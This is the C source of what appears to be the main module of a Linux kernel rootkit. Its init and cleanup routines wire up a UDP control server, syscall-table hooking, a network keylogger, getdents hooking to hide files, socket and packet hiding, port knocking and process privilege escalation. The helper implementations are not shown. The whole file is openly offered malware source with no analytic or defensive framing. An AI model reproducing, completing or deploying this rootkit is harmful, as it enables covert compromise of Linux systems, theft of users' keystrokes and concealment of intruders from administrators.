#include "utils.h"
#include "core.h"
#include "network_keylog.h"
#include "module_hiding.h"
#include "getdents_hook.h"
#include "socket_hiding.h"
#include "packet_hiding.h"
#include "port_knocking.h"
#include "privilege_escalation.h"
#include "server.h"

int init_module(void)
{
	debug("Rootkit module initializing...\n");

	/* start udp server */
	if(udp_server_start()) {
		alert("Error on udp_server_start\n");
		return -EINVAL;
	}

	/* set sys call table pointer */
	if(set_sys_call_table()) {
		alert("Error on set_sys_call_table\n");
		return -EINVAL;
	}

	/* init keylogger */
	if(network_keylogger_init()) {
		alert("Error on network_keylogger_init\n");
		return -EINVAL;
	}

	/* hook getdents */
	if(hook_getdents_init()) {
		alert("Error on hook_getdents_init\n");
		return -EINVAL;
	}

	/* hook recvmsg */
	if(socket_hiding_init()) {
		alert("Error on socket_hiding_init\n");
		return -EINVAL;
	}

	/* hook packets */
	if(packet_hiding_init()) {
		alert("Error on packet_hiding_init\n");
		return -EINVAL;
	}

	/* port knocking */
	if(port_knocking_init()) {
		alert("Error on port_knocking_init\n");
		return -EINVAL;
	}

	/* privilege escalation */
	if(priv_escalation_init()) {
		alert("Error on priv_escalation_init\n");
		return -EINVAL;
	}

	debug("Rootkit module successfully initialized.\n");

	return 0;
}

void reset_module(void)
{
	/* close udp server */
	debug("Close UDP connection...");
	udp_server_close();
	debug("UDP connection closed.");

	/* keylogger exit */
	debug("Reset keylogger and hooked terminals...");
	network_keylogger_exit();
	debug("Terminals unhooked.");

	/* getdents unhook */
	debug("Reset getdents system calls...");
	hook_getdents_exit();
	debug("getdents system calls back to original.");

	/* socket hiding exit */
	debug("Reset tcpX_show functions...");
	socket_hiding_exit();
	debug("tcpX_show functions back to original.");

	/* packet hiding exit */
	debug("Reset packet_rcv functions...");
	packet_hiding_exit();
	debug("packet_rcv functions back to original.");

	/* port knocking exit */
	debug("Clear list of IP senders and ports and unregister hook...");
	port_knocking_exit();
	debug("All lists cleared and hook unregistered.");

	/* privilege escalation exit */
	debug("Clear list of escalated processes...");
	priv_escalation_exit();
	debug("All lists cleared and processes deescalated.");
}

void cleanup_module(void)
{
	debug("Unloading rootkit module...");
	reset_module();
	debug("Rootkit module unloaded.\n");
}

MODULE_LICENSE("GPL");